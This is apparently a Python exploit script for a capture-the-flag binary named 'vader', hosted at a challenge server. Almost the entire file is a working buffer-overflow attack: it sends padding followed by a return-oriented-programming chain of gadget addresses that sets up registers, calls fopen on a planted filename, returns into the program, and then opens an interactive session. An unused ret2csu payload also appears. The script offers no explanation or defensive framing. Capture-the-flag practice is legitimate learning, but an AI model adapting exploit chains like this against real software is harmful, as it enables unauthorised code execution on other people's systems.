#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./vader')
host = args.HOST or '0.cloud.chals.io'
port = int(args.PORT or 20712)

gdbscript = '''
tbreak main
# b *0x401545
b *main+68
continue
'''.format(**locals())

libc=SetupLibcELF()
io = start()

re()

payload2=flat([

	b'a'*32,
	0x405100,
	0x0000000000401652,
	"sith.txt",
	0x405120+0x3d,
	0,
	0,
	0,
	0,
	0x0000000040116c,
	0x0000000000401652,
	".txt\0\0\0\0",
	0x405120+0x3d+4,
	0,
	0,
	0,
	0,
	0x0000000040116c,
	pop("rdi", p(0x405120)),
	pop("rsi", p(0x402ee0)),
	pop("rdx", p(0x0)),
	exe.sym.fopen,
	# pop("rcx", "TH3".ljust(8, '\x00')),
	# pop("r8",  "FORC3".ljust(8, '\x00')),
	# ret2csu(rdi=0x405120, rsi=0x402ee0, rdx=0, what=exe.got.fopen),
	pop("rbp", 0x405110),
	0x000000000040155e,
	# ret2csu(),
	exe.sym.vader

])

payload1=flat([

	b'a'*32,
	ret2csu(rdi=0x405120, rsi=0x402ee0, rdx=0, what=exe.got.fopen),


])

sl(payload2)

io.interactive()
